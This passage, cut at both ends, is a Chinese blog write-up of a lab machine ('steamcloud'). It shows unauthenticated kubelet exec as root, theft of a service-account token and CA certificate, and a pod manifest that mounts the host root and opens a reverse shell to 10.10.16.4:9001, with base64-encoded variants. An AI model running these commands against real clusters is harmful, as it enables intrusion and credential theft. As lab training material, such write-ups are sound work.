DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1</span><br><span class="hljs-string">| Not valid before: 2022-05-13T10:01:57</span><br><span class="hljs-string">|_Not valid after:  2025-05-13T10:01:57</span><br><span class="hljs-string">10249/tcp open   http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span><br><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (text/plain; charset=utf-8).<br>10256/tcp open   http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/plain; charset=utf-8).</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 150.10 seconds</span><br></code></pre></td></tr></table></figure><p>kubernetes我第一次接触，我尝试寻找官方文档：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>kubernetes.io<span class="hljs-regexp">/docs/</span>concepts<span class="hljs-regexp">/overview/</span>what-is-kubernetes/<br></code></pre></td></tr></table></figure><p>2379端口是https协议，但是如果我尝试访问，会拒绝我，并且一直是我最初浏览器提示的证书不可信的警告。2380也是如此：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514182113201.png" alt="image-20220514182113201"  /><p>8443会自动为我弹出一些信息，看来是不允许匿名用户访问：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514182224229.png" alt="image-20220514182224229"  /><p>10249与10256是一样的：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514182427258.png" alt="image-20220514182427258"  /><h4 id="kubernetes初探："><a href="#kubernetes初探：" class="headerlink" title="kubernetes初探："></a>kubernetes初探：</h4><h5 id="Kubectl："><a href="#Kubectl：" class="headerlink" title="Kubectl："></a>Kubectl：</h5><p>触及知识盲区了，幸好我在官方文档里找到了这个：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>kubernetes.io<span class="hljs-regexp">/docs/</span>tasks<span class="hljs-regexp">/tools/</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514193051801.png" alt="image-20220514193051801"  /><p>或许我可以试着用该工具去管理目标，即使按经验来讲这种功能要用户名密码认证而我什么都没有，可通过命令进行下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -LO <span class="hljs-string">&quot;https://dl.k8s.io/release/<span class="hljs-subst">$(curl -L -s https://dl.k8s.io/release/stable.txt)</span>/bin/linux/amd64/kubectl&quot;</span><br></code></pre></td></tr></table></figure><p>下载完后再下载校验工具进行校验：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -LO <span class="hljs-string">&quot;https://dl.k8s.io/<span class="hljs-subst">$(curl -L -s https://dl.k8s.io/release/stable.txt)</span>/bin/linux/amd64/kubectl.sha256&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(cat kubectl.sha256)</span>  kubectl&quot;</span> | <span class="hljs-built_in">sha256sum</span> --check<br>kubectl: 成功<br></code></pre></td></tr></table></figure><p>通过如下命令进行安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl<br></code></pre></td></tr></table></figure><p>查看信息，安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubectl version --client --output=yaml   <br>clientVersion:<br>  buildDate: <span class="hljs-string">&quot;2022-05-03T13:46:05Z&quot;</span><br>  compiler: gc<br>  gitCommit: 4ce5a8954017644c5420bae81d72b09b735c21f0<br>  gitTreeState: clean<br>  gitVersion: v1.24.0<br>  goVersion: go1.18.1<br>  major: <span class="hljs-string">&quot;1&quot;</span><br>  minor: <span class="hljs-string">&quot;24&quot;</span><br>  platform: linux/amd64<br>kustomizeVersion: v4.5.4<br></code></pre></td></tr></table></figure><p>但是我尝试链接目标，果不其然的都要用户名和密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo kubectl --server https://10.10.11.133:10249  get pod<br>Please enter Username: admin<br>Please enter Password: <br>Unable to connect to the server: http: server gave HTTP response to HTTPS client<br></code></pre></td></tr></table></figure><h5 id="kubeletctl："><a href="#kubeletctl：" class="headerlink" title="kubeletctl："></a>kubeletctl：</h5><p>这总不能让我硬猜吧。接着Google帮我找到了这个：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://github.com/cyberark/kubeletctl<br></code></pre></td></tr></table></figure><p>它有很多功能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Available Commands:<br>  attach        Attach to a container<br>  configz       Return kubelet<span class="hljs-string">&#x27;s configuration.</span><br><span class="hljs-string">  containerLogs Return container log</span><br><span class="hljs-string">  cri           Run commands inside a container through the Container Runtime Interface (CRI)</span><br><span class="hljs-string">  debug         Return debug information (pprof or flags)</span><br><span class="hljs-string">  exec          Run commands inside a container</span><br><span class="hljs-string">  healthz       Check the state of the node</span><br><span class="hljs-string">  help          Help about any command</span><br><span class="hljs-string">  log           Return the log from the node.</span><br><span class="hljs-string">  metrics       Return resource usage metrics (such as container CPU, memory usage, etc.)</span><br><span class="hljs-string">  pods          Get list of pods on the node</span><br><span class="hljs-string">  portForward   Attach to a container</span><br><span class="hljs-string">  run           Run commands inside a container</span><br><span class="hljs-string">  runningpods   Returns all pods running on kubelet from looking at the container runtime cache.</span><br><span class="hljs-string">  scan          Scans for nodes with opened kubelet API</span><br><span class="hljs-string">  spec          Cached MachineInfo returned by cadvisor</span><br><span class="hljs-string">  stats         Return statistical information for the resources in the node.</span><br><span class="hljs-string">  version       Print the version of the kubeletctl</span><br></code></pre></td></tr></table></figure><p>我可以尝试访问目标的PODS，它奏效了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl pods -s 10.10.11.133 <br>┌───────────────────────────────────────────────────────────────────────────────────┐<br>│                                 Pods from Kubelet                                 │<br>├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤<br>│   │ POD                                │ NAMESPACE   │ CONTAINERS              │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 1 │ coredns-78fcd69978-qr9j8           │ kube-system │ coredns                 │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 2 │ nginx                              │ default     │ nginx                   │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 4 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 5 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 6 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 7 │ storage-provisioner                │ kube-system │ storage-provisioner     │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 8 │ kube-proxy-4cnt8                   │ kube-system │ kube-proxy              │<br>│   │                                    │             │                         │<br>└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘<br><br></code></pre></td></tr></table></figure><p>只有nginx不在kube-system空间中，不知道这是否是作者为我遗留的路径。</p><h4 id="User-txt："><a href="#User-txt：" class="headerlink" title="User.txt："></a>User.txt：</h4><p>在帮助信息中我还看到了exec，或许我可以试着去执行一下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;id&quot;</span> -p nginx -c nginx <br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>它可以，而且还是root，或许我可以试着读取root.txt:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /root/root.txt&quot;</span> -p nginx -c nginx<br><span class="hljs-built_in">cat</span>: /root/root.txt: No such file or directory<br><span class="hljs-built_in">command</span> terminated with <span class="hljs-built_in">exit</span> code 1<br></code></pre></td></tr></table></figure><p>它告诉我没有文件，哦，root下边是一个user.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;ls /root&quot;</span> -p nginx -c nginx<br>user.txt<br>&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /root/user.txt&quot;</span> -p nginx -c nginx<br>cd8bbd...............................<br></code></pre></td></tr></table></figure><h4 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt:"></a>root.txt:</h4><p>我尝试反弹bash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;which bash&quot;</span> -p nginx -c nginx<br>/bin/bash<br>&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&#x27;&quot;</span> -p nginx -c nginx<br>-i: -c: line 0: unexpected EOF <span class="hljs-keyword">while</span> looking <span class="hljs-keyword">for</span> matching `<span class="hljs-string">&#x27;&#x27;</span><br>-i: -c: line 1: syntax error: unexpected end of file<br><span class="hljs-built_in">command</span> terminated with <span class="hljs-built_in">exit</span> code 1<br>&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&quot;</span> -p nginx -c nginx <br>bash: &gt;: No such file or directory<br><span class="hljs-built_in">command</span> terminated with <span class="hljs-built_in">exit</span> code 127<br></code></pre></td></tr></table></figure><p>我尝试编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzkwMDEgMD4mMQo=&quot;| base64 -d | bash&quot;&#x27;</span> -p nginx -c nginx<br><span class="hljs-string">&quot;YmFzaCAtaSA JiAvZGV2L3RjcC8xMC4xMC4xNi40LzkwMDEgMD4mMQo=&quot;</span>| <span class="hljs-built_in">base64</span> -d | bash<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>不太行，怎么编的就怎么还回来，似乎它只能执行一些简单的命令，我又在谷歌搜了一堆，我找到了这篇文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>labs.f-secure.com<span class="hljs-regexp">/blog/</span>attacking-kubernetes-through-kubelet<br></code></pre></td></tr></table></figure><p>它为我讲述了kubernetes如何测试，会有一些敏感目录，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/run/secrets/kubernetes.io/serviceaccount/token<br></code></pre></td></tr></table></figure><p>我可以窃取到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span> -p nginx -c nginx<br>eyJhbGciOiJSUzI1NiIsImtpZCI6InNaQkd1a0xEWVNDeHBhSTNXTVE5Yl82SjExZnRtX3JxN3FWTmtGQXMzS28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg0MDY3MzM1LCJpYXQiOjE2NTI1MzEzMzUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImJlODRjNTU0LTg1MDItNGFhZi05OGNhLWQyZTgzNTNjOTNjNSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjYxYjFkMDBkLTMwNmUtNDE4MS04NzdiLWFkNDQxMTk3ZTk1MSJ9LCJ3YXJuYWZ0ZXIiOjE2NTI1MzQ5NDJ9LCJuYmYiOjE2NTI1MzEzMzUsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.F-aIO1xYv8b_6WusHstg43jLPDt_BtYxOvXSH4MZtf71OzjuuKXpN4Dsi8OMQX-IQ_yMyhjTYWhjDZpZ-Lb1bmEJbDbUDM1DqfVvxkmAHp_sGQqxbyqnkM04EvIhcjrKW8I_pQKSkK22NGZYcManSUmJuZLFn12XSKzOp3javgR62St4KCYemXLrd-N-s4wUpUkUCgbabfLkx7TJtSOjM2FRCqkfZo9w5sQ_mXhbKs998EXV-VdWR-iWt1A3hggteiIn4j3LyUxmET9UD1jXU8N6kzYZkrWTdoUCyQSK5jolwCAYdsoCN8QGHYPFxDgTvJRzXz7kNDXXL6D_BCf5Ow <br></code></pre></td></tr></table></figure><p>我尝试了解码，但是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6InNaQkd1a0xEWVNDeHBhSTNXTVE5Yl82SjExZnRtX3JxN3FWTmtGQXMzS28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg0MDY3MzM1LCJpYXQiOjE2NTI1MzEzMzUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImJlODRjNTU0LTg1MDItNGFhZi05OGNhLWQyZTgzNTNjOTNjNSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjYxYjFkMDBkLTMwNmUtNDE4MS04NzdiLWFkNDQxMTk3ZTk1MSJ9LCJ3YXJuYWZ0ZXIiOjE2NTI1MzQ5NDJ9LCJuYmYiOjE2NTI1MzEzMzUsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.F-aIO1xYv8b_6WusHstg43jLPDt_BtYxOvXSH4MZtf71OzjuuKXpN4Dsi8OMQX-IQ_yMyhjTYWhjDZpZ-Lb1bmEJbDbUDM1DqfVvxkmAHp_sGQqxbyqnkM04EvIhcjrKW8I_pQKSkK22NGZYcManSUmJuZLFn12XSKzOp3javgR62St4KCYemXLrd-N-s4wUpUkUCgbabfLkx7TJtSOjM2FRCqkfZo9w5sQ_mXhbKs998EXV-VdWR-iWt1A3hggteiIn4j3LyUxmET9UD1jXU8N6kzYZkrWTdoUCyQSK5jolwCAYdsoCN8QGHYPFxDgTvJRzXz7kNDXXL6D_BCf5Ow&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;RS256&quot;</span>,<span class="hljs-string">&quot;kid&quot;</span>:<span class="hljs-string">&quot;sZBGukLDYSCxpaI3WMQ9b_6J11ftm_rq7qVNkFAs3Ko&quot;</span>&#125;<span class="hljs-built_in">base64</span>: 输入无效<br></code></pre></td></tr></table></figure><p>它还有其他敏感目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/run/</span>secrets<span class="hljs-regexp">/kubernetes.io/</span>serviceaccount<br><span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/secrets/</span>kubernetes.io/serviceaccount<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;ls /run/secrets/kubernetes.io/serviceaccount&quot;</span> -p nginx -c nginx<br>ca.crtnamespace  token<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;ls /var/run/secrets/kubernetes.io/serviceaccount&quot;</span> -p nginx -c nginx<br>ca.crtnamespace  token<br></code></pre></td></tr></table></figure><p>以免复制粘贴错误，可以转存一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /run/secrets/kubernetes.io/serviceaccount/ca.crt&quot;</span> -p nginx -c nginx | <span class="hljs-built_in">tee</span> ca.crt                <br>-----BEGIN CERTIFICATE-----<br>MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p<br>a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE<br>AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa<br>YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M<br>HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7<br>deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG<br>VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll<br>hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o<br>1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW<br>MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW<br>BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm<br>lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO<br>DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+<br>9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D<br>xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0<br>JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz<br>kf2eZIBNMp0TFg==<br>-----END CERTIFICATE-----<br></code></pre></td></tr></table></figure><p>也可以创建一个变量用来保存token，就像powershell那样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> token=$(kubeletctl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /run/secrets/kubernetes.io/serviceaccount/token&quot;</span> -p nginx -c nginx)<br></code></pre></td></tr></table></figure><p>然后可以拿着证书与令牌，对 Kubernetes API 进行身份验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=<span class="hljs-variable">$token</span> get pod<br>NAME    READY   STATUS    RESTARTS   AGE<br>nginx   1/1     Running   0          164m<br></code></pre></td></tr></table></figure><p>看起来可行，这次它没要求我输入账号密码，可是我能做什么呢。在kubectl还有auth can-i命令，可以查看我给定账户有什么权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=<span class="hljs-variable">$token</span><br>Resources                                       Non-Resource URLs                     Resource Names   Verbs<br>selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]<br>selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]<br>pods                                            []                                    []               [get create list]<br>                                                [/.well-known/openid-configuration]   []               [get]<br>                                                [/api/*]                              []               [get]<br>                                                [/api]                                []               [get]<br>                                                [/apis/*]                             []               [get]<br>                                                [/apis]                               []               [get]<br>                                                [/healthz]                            []               [get]<br>                                                [/healthz]                            []               [get]<br>                                                [/livez]                              []               [get]<br>                                                [/livez]                              []               [get]<br>                                                [/openapi/*]                          []               [get]<br>                                                [/openapi]                            []               [get]<br>                                                [/openid/v1/jwks]                     []               [get]<br>                                                [/readyz]                             []               [get]<br>                                                [/readyz]                             []               [get]<br>                                                [/version/]                           []               [get]<br>                                                [/version/]                           []               [get]<br>                                                [/version]                            []               [get]<br>                                                [/version]                            []               [get]<br></code></pre></td></tr></table></figure><p>我似乎可以创建文件，我可以拿上边示例文章中的payload试试：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">mosaic-pod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mosaic-pod</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.14.2</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;/bin/bash&quot;</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&quot;</span>]<br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">host</span><br>      <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/host</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">host</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>      <span class="hljs-attr">type:</span> <span class="hljs-string">Directory</span><br></code></pre></td></tr></table></figure><p>我创建成功了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubectl --insecure-skip-tls-verify=<span class="hljs-literal">true</span> \<br>          --server=<span class="hljs-string">&quot;https://10.10.11.133:8443&quot;</span> \<br>          --token=<span class="hljs-string">&quot;<span class="hljs-variable">$token</span>&quot;</span> \<br>          create -f shell.yaml<br>pod/mosa-pod created<br></code></pre></td></tr></table></figure><p>而我也收到了反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 